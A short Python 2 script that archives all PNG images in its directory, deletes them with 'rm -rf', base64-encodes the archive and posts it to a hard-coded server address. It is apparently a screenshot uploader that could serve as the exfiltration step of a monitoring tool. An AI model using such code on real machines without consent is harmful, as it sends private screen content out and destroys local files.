#!/usr/bin/env python
# coding=utf-8
import urllib
import urllib2
import json
import base64
import os
import time
server_ip = '192.168.8.55'
server_port = 8080


class Handle_files():

    def __init__(self):
        pass

    def compress_files(self):
        if os.path.exists('shot.tar.gz'):
            cmd = 'rm -rf shot.tar.gz'
            os.system(cmd)

        cmd = 'tar zcf ' + 'shot.tar.gz ' + '*.png'
        os.system(cmd)
        cmd = 'rm -rf *.png'
        os.system(cmd)

    def json_dumps(self, sdict):
        return base64.b64encode(json.dumps(sdict))

    def send_to_server(self):
        f = open('shot.tar.gz', 'rb')
        pic_content = f.read()

        pic_content = base64.b64encode(pic_content)
        t = {'pic': pic_content,
             }

        t = self.json_dumps(t)
        packet = {'content': t}
        encode = urllib.urlencode(packet)
        result = urllib2.urlopen(
            'http://%s:%s/submit' % (server_ip, server_port), encode).read()
        print result


if __name__ == '__main__':
    handle_file = Handle_files()
    handle_file.compress_files()
    handle_file.send_to_server()
